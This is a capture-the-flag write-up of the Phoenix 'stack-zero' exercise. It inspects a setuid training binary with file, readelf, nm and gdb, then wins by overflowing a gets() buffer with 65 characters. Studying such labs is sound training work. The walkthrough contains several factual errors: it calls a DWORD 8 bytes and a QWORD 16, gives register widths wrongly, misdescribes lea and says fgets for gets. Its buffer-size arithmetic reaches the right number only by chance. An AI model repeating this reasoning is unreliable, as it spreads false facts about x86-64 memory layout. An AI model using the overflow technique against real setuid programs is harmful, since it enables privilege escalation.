
# Stack Zero
Stack zero is the first challenge of the Phoenix exploitation set of challenges, it is available at https://exploit.education/

## Taking a first look at the binary
The binary name is `stack-zero`, it has the setuid and setgid bit enabled which means it can be run as root with most users on the system.

It has been compiled as a ELF 64-bit LSB (Least-Significant Byte or Little Endian) and is not stripped so you can still see most symbols and functions calls, you can see this by yourself on the following output :
```
$ file ./stack-zero  
./stack-zero: setuid, setgid ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl  
-x86_64.so.1, not stripped
```

## ELF Header
It's always good practice to check the ELF Header of the file you're analyzing
```
$ readelf -h stack-zero   
ELF Header:  
 Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00    
 Class:                             ELF64  
 Data:                              2's complement, little endian  
 Version:                           1 (current)  
 OS/ABI:                            UNIX - System V  
 ABI Version:                       0  
 Type:                              EXEC (Executable file)  
 Machine:                           Advanced Micro Devices X86-64  
 Version:                           0x1  
 Entry point address:               0x400470  
 Start of program headers:          64 (bytes into file)  
 Start of section headers:          4352 (bytes into file)  
 Flags:                             0x0  
 Size of this header:               64 (bytes)  
 Size of program headers:           56 (bytes)  
 Number of program headers:         7  
 Size of section headers:           64 (bytes)  
 Number of section headers:         23  
 Section header string table index: 20
```
We can once again see the file is an ELF64 and it uses Little Endian Memory Addressing

## First program run
We can take a look at the program symbols using `nm`.
```
$ nm stack-zero   
0000000000600978 B __bss_start  
0000000000600980 b completed.5577  
00000000006007e0 d __CTOR_END__  
00000000006007d8 d __CTOR_LIST__  
00000000004004b0 t deregister_tm_clones  
0000000000400630 t __do_global_ctors_aux  
0000000000400520 t __do_global_dtors_aux  
0000000000600970 D __dso_handle  
00000000006007f0 D __DTOR_END__  
0000000000600988 b dtor_idx.5579  
00000000006007e8 d __DTOR_LIST__  
00000000006007f8 d _DYNAMIC  
0000000000600978 D _edata  
00000000004007b0 r __EH_FRAME_BEGIN__  
00000000006009d0 B _end  
                 U exit  
0000000000400672 T _fini  
00000000004005b0 t frame_dummy  
00000000004007d0 r __FRAME_END__  
                 U gets  
0000000000600938 d _GLOBAL_OFFSET_TABLE_  
0000000000400754 r __GNU_EH_FRAME_HDR  
0000000000400408 T _init  
                 U __libc_start_main  
00000000004005dd T main  
00000000006009a0 b object.5589  
                 U puts  
00000000004004e0 t register_tm_clones  
0000000000400470 T _start  
0000000000400486 T _start_c  
0000000000600978 D __TMC_END__
```
If you do not understand the output of `nm` please go read it's man page by using the following command -> `man nm`

The following functions could possibly be useful for us :
- exit
- gets
- main
- puts

## First program run
Let's take a first look at how the program works and how we can win this challenge
```
./stack-zero   
Welcome to phoenix/stack-zero, brought to you by https://exploit.education  
asdfg  
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```
The programs wait for us to input something through the fgets function in this case i inputted `asdfg`, apparently we need to change the value of changeme on the stack, this can be done pretty simply by overflowing our gets buffer, let's take a look in gdb at our main function
```
pwndbg> disass main  
Dump of assembler code for function main:  
  0x00000000004005dd <+0>:     push   rbp  
  0x00000000004005de <+1>:     mov    rbp,rsp  
  0x00000000004005e1 <+4>:     sub    rsp,0x60                  ;prepare the stack with 0x60 (96) bytes
  0x00000000004005e5 <+8>:     mov    DWORD PTR [rbp-0x54],edi  ;mov edi (32bit) into the address at rbp-0x54 and adjust the stack size by 8 bytes (DWORD size)
  0x00000000004005e8 <+11>:    mov    QWORD PTR [rbp-0x60],rsi  ;mov rsi (64bit) into the address at rbp-0x60 and adjust the stack size by 16 bytes (QWORD size)
  0x00000000004005ec <+15>:    mov    edi,0x400680              ;load a string into edi (32bits or 4 bytes) 
  0x00000000004005f1 <+20>:    call 0x400440 <puts@plt>         ;print the message we just loaded into edi
  0x00000000004005f6 <+25>:    mov    DWORD PTR [rbp-0x10],0x0  ;mov 0x0 into the address at rbp-0x10 and adjust the stack size by 8 bytes (DWORD size)
  0x00000000004005fd <+32>:    lea    rax,[rbp-0x50]            ;mov the value at address $rbp-0x50 into rax
  0x0000000000400601 <+36>:    mov    rdi,rax                   ;mov rax our buffer into rdi
  0x0000000000400604 <+39>:    call 0x400430 <gets@plt>         ;call to gets with our buffer as an argument
  0x0000000000400609 <+44>:    mov    eax,DWORD PTR [rbp-0x10]  ;load the address at $rbp-0x10 into eax (basically the value we need to overflow)
  0x000000000040060c <+47>:    test   eax,eax                   ;test that value, if eax AND eax == 0 we fail else we win
  0x000000000040060e <+49>:    je 0x40061c <main+63>            ;fail if eax == 0
  0x0000000000400610 <+51>:    mov    edi,0x4006d0              ;mov our victory string into edi
  0x0000000000400615 <+56>:    call 0x400440 <puts@plt>         ;print our victory string
  0x000000000040061a <+61>:    jmp 0x400626 <main+73>           ;jump at main 73 and exit the program
  0x000000000040061c <+63>:    mov    edi,0x400708              ;mov our fail string into edi
  0x0000000000400621 <+68>:    call 0x400440 <puts@plt>         ;print that string
  0x0000000000400626 <+73>:    mov    edi,0x0                   ;move 0x0 into edi
  0x000000000040062b <+78>:    call 0x400450 <exit@plt>         ;call exit(edi) or exit(0x0)
End of assembler dump.  
pwndbg>
```

We now know that to win this challenge we need to overwrite the buffer at $rbp-0x10, using our $rbp-0x50 array of chars.

We have set our stack size to 0x60 (96), we first need to determine the size of our buffer and to do this we can check our stack size.

## The exploit
Well here i say exploit but it's not that much of an exploit, we're basically just overwriting our stack, anyway here it is

First we need to understand how much size our buffer really is
```
0x00000000004005e1 <+4>:     sub    rsp,0x60
0x00000000004005e5 <+8>:     mov    DWORD PTR [rbp-0x54],edi
0x00000000004005e8 <+11>:    mov    QWORD PTR [rbp-0x60],rsi
0x00000000004005f6 <+25>:    mov    DWORD PTR [rbp-0x10],0x0
```

We first allocate 0x60 bytes into our stack for all the variables in our current program, this lead me to think that there is now possible way that our buffer could be bigger than `0x60 or 96 in decimal`.

The next instruction at main+8 moves `edi (8-bit address)` into a `DWORD PTR` located at `$rbp-0x54 on the stack`, this will remove 8 bytes from our current 0x60 bytes allocated on the stack.
`0x60 - 0x8 = 0x58`

The next instruction at main+11 moves `rsi (16-bit address)` into a `QWORD PTR` located at `$rbp-0x60 on the stack`, this will remove 16 bytes from our current 0x58 bytes allocated on the stack.
`0x58 - 0x10 = 0x48`

The next instruction at main+25 moves `0x0 or 0` into a `DWORD PTR` located at `$rbp-0x10 on the stack`, this will remove 8 bytes from our current stack, the rest of the bytes allocated for ESP will be used for our buffer size at `$rbp-0x50`
```
>>> hex(0x60 - 0x8 - 0x10 - 0x8)  
'0x40'
>>> 0x40  
64
```

So we can try to run our program with 64 characters just to see if we get anything
```
$ ./stack-zero <<<$(python -c 'print("A" * 64)') 130 ⨯  
Welcome to phoenix/stack-zero, brought to you by https://exploit.education  
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```
As expected we did not overwrite changeme...
Now let's try with 65 characters
```
$ ./stack-zero <<<$(python -c 'print("A" * 65)')  
Welcome to phoenix/stack-zero, brought to you by https://exploit.education  
Well done, the 'changeme' variable has been changed!
```
And we win the challenge !!
